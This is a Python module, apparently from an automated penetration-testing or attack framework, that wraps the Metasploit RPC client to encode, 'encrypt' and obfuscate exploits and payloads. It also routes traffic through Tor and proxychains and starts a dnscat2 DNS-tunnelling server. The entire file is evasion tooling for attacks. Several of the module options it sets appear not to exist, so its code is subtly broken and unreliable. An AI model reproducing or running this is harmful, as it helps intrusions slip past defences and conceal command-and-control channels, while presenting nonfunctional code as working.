#!/usr/bin/env python3

import logging
import subprocess
import os
import time
import random
import string
from typing import Dict, List
from pymetasploit3.msfrpc import MsfRpcClient

logger = logging.getLogger(__name__)

class Evasion:
    def __init__(self, msf_client: MsfRpcClient, config: Dict):
        """Inicializa el módulo de evasión"""
        self.msf_client = msf_client
        self.config = config
        self.temp_dir = os.path.join(os.path.dirname(__file__), "..", "..", "temp")
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def apply_evasion_techniques(self, exploit: Dict, payload: Dict) -> Dict:
        """Aplica técnicas de evasión a un exploit y payload"""
        try:
            # Obtener técnicas de evasión configuradas
            evasion_config = self.config.get("evasion_techniques", {})
            
            # Aplicar técnicas de evasión de payload
            if "payload_encoding" in evasion_config:
                payload = self._apply_payload_encoding(payload)
            
            if "payload_encryption" in evasion_config:
                payload = self._apply_payload_encryption(payload)
            
            if "payload_obfuscation" in evasion_config:
                payload = self._apply_payload_obfuscation(payload)
            
            # Aplicar técnicas de evasión de exploit
            if "exploit_encoding" in evasion_config:
                exploit = self._apply_exploit_encoding(exploit)
            
            if "exploit_encryption" in evasion_config:
                exploit = self._apply_exploit_encryption(exploit)
            
            if "exploit_obfuscation" in evasion_config:
                exploit = self._apply_exploit_obfuscation(exploit)
            
            # Aplicar técnicas de evasión de red
            if "network_evasion" in evasion_config:
                self._apply_network_evasion()
            
            return {
                "exploit": exploit,
                "payload": payload
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar técnicas de evasión: {str(e)}")
            return {
                "exploit": exploit,
                "payload": payload
            }
    
    def _apply_payload_encoding(self, payload: Dict) -> Dict:
        """Aplica técnicas de codificación al payload"""
        try:
            if not self.msf_client:
                return payload
            
            # Obtener configuración de codificación
            encoding_config = self.config.get("evasion_techniques", {}).get("payload_encoding", {})
            encoder = encoding_config.get("encoder", "x86/shikata_ga_nai")
            iterations = encoding_config.get("iterations", 1)
            
            # Aplicar codificación
            payload_obj = self.msf_client.modules.use('payload', payload["type"])
            payload_obj['EnableStageEncoding'] = True
            payload_obj['StageEncoder'] = encoder
            payload_obj['StageEncoderIterations'] = iterations
            
            return {
                "type": payload["type"],
                "options": payload_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar codificación de payload: {str(e)}")
            return payload
    
    def _apply_payload_encryption(self, payload: Dict) -> Dict:
        """Aplica técnicas de encriptación al payload"""
        try:
            if not self.msf_client:
                return payload
            
            # Obtener configuración de encriptación
            encryption_config = self.config.get("evasion_techniques", {}).get("payload_encryption", {})
            algorithm = encryption_config.get("algorithm", "aes256")
            key = encryption_config.get("key", self._generate_random_key())
            
            # Aplicar encriptación
            payload_obj = self.msf_client.modules.use('payload', payload["type"])
            payload_obj['EnableEncryption'] = True
            payload_obj['EncryptionAlgorithm'] = algorithm
            payload_obj['EncryptionKey'] = key
            
            return {
                "type": payload["type"],
                "options": payload_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar encriptación de payload: {str(e)}")
            return payload
    
    def _apply_payload_obfuscation(self, payload: Dict) -> Dict:
        """Aplica técnicas de ofuscación al payload"""
        try:
            if not self.msf_client:
                return payload
            
            # Obtener configuración de ofuscación
            obfuscation_config = self.config.get("evasion_techniques", {}).get("payload_obfuscation", {})
            technique = obfuscation_config.get("technique", "random")
            
            # Aplicar ofuscación
            payload_obj = self.msf_client.modules.use('payload', payload["type"])
            payload_obj['EnableObfuscation'] = True
            payload_obj['ObfuscationTechnique'] = technique
            
            return {
                "type": payload["type"],
                "options": payload_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar ofuscación de payload: {str(e)}")
            return payload
    
    def _apply_exploit_encoding(self, exploit: Dict) -> Dict:
        """Aplica técnicas de codificación al exploit"""
        try:
            if not self.msf_client:
                return exploit
            
            # Obtener configuración de codificación
            encoding_config = self.config.get("evasion_techniques", {}).get("exploit_encoding", {})
            encoder = encoding_config.get("encoder", "x86/shikata_ga_nai")
            iterations = encoding_config.get("iterations", 1)
            
            # Aplicar codificación
            exploit_obj = self.msf_client.modules.use('exploit', exploit["type"])
            exploit_obj['EnableStageEncoding'] = True
            exploit_obj['StageEncoder'] = encoder
            exploit_obj['StageEncoderIterations'] = iterations
            
            return {
                "type": exploit["type"],
                "options": exploit_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar codificación de exploit: {str(e)}")
            return exploit
    
    def _apply_exploit_encryption(self, exploit: Dict) -> Dict:
        """Aplica técnicas de encriptación al exploit"""
        try:
            if not self.msf_client:
                return exploit
            
            # Obtener configuración de encriptación
            encryption_config = self.config.get("evasion_techniques", {}).get("exploit_encryption", {})
            algorithm = encryption_config.get("algorithm", "aes256")
            key = encryption_config.get("key", self._generate_random_key())
            
            # Aplicar encriptación
            exploit_obj = self.msf_client.modules.use('exploit', exploit["type"])
            exploit_obj['EnableEncryption'] = True
            exploit_obj['EncryptionAlgorithm'] = algorithm
            exploit_obj['EncryptionKey'] = key
            
            return {
                "type": exploit["type"],
                "options": exploit_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar encriptación de exploit: {str(e)}")
            return exploit
    
    def _apply_exploit_obfuscation(self, exploit: Dict) -> Dict:
        """Aplica técnicas de ofuscación al exploit"""
        try:
            if not self.msf_client:
                return exploit
            
            # Obtener configuración de ofuscación
            obfuscation_config = self.config.get("evasion_techniques", {}).get("exploit_obfuscation", {})
            technique = obfuscation_config.get("technique", "random")
            
            # Aplicar ofuscación
            exploit_obj = self.msf_client.modules.use('exploit', exploit["type"])
            exploit_obj['EnableObfuscation'] = True
            exploit_obj['ObfuscationTechnique'] = technique
            
            return {
                "type": exploit["type"],
                "options": exploit_obj.options
            }
        
        except Exception as e:
            logger.error(f"Error al aplicar ofuscación de exploit: {str(e)}")
            return exploit
    
    def _apply_network_evasion(self):
        """Aplica técnicas de evasión de red"""
        try:
            # Obtener configuración de evasión de red
            network_config = self.config.get("evasion_techniques", {}).get("network_evasion", {})
            
            # Aplicar técnicas de evasión de red
            if network_config.get("enable_tor", False):
                self._enable_tor()
            
            if network_config.get("enable_proxy", False):
                self._enable_proxy(network_config.get("proxy", {}))
            
            if network_config.get("enable_dns_tunneling", False):
                self._enable_dns_tunneling()
        
        except Exception as e:
            logger.error(f"Error al aplicar evasión de red: {str(e)}")
    
    def _enable_tor(self):
        """Habilita el uso de Tor para el tráfico"""
        try:
            # Verificar si Tor está instalado
            if not os.path.exists("/usr/sbin/tor"):
                logger.warning("Tor no está instalado")
                return
            
            # Iniciar servicio Tor
            subprocess.run(["service", "tor", "start"], check=True)
            
            # Configurar proxychains
            with open("/etc/proxychains.conf", "r") as f:
                config = f.read()
            
            if "socks5 127.0.0.1 9050" not in config:
                with open("/etc/proxychains.conf", "a") as f:
                    f.write("\nsocks5 127.0.0.1 9050\n")
        
        except Exception as e:
            logger.error(f"Error al habilitar Tor: {str(e)}")
    
    def _enable_proxy(self, proxy_config: Dict):
        """Habilita el uso de proxy para el tráfico"""
        try:
            # Configurar variables de entorno
            os.environ["http_proxy"] = proxy_config.get("http_proxy", "")
            os.environ["https_proxy"] = proxy_config.get("https_proxy", "")
            
            # Configurar proxychains
            with open("/etc/proxychains.conf", "r") as f:
                config = f.read()
            
            proxy_line = f"{proxy_config.get('type', 'http')} {proxy_config.get('host', '')} {proxy_config.get('port', '')}"
            if proxy_line not in config:
                with open("/etc/proxychains.conf", "a") as f:
                    f.write(f"\n{proxy_line}\n")
        
        except Exception as e:
            logger.error(f"Error al habilitar proxy: {str(e)}")
    
    def _enable_dns_tunneling(self):
        """Habilita el uso de DNS tunneling para el tráfico"""
        try:
            # Verificar si dnscat2 está instalado
            if not os.path.exists("/opt/dnscat2"):
                logger.warning("dnscat2 no está instalado")
                return
            
            # Iniciar servidor DNS
            subprocess.Popen(["/opt/dnscat2/server/dnscat2", "--dns", "domain=example.com"], 
                           stdout=subprocess.PIPE, 
                           stderr=subprocess.PIPE)
        
        except Exception as e:
            logger.error(f"Error al habilitar DNS tunneling: {str(e)}")
    
    def _generate_random_key(self, length: int = 32) -> str:
        """Genera una clave aleatoria"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length)) 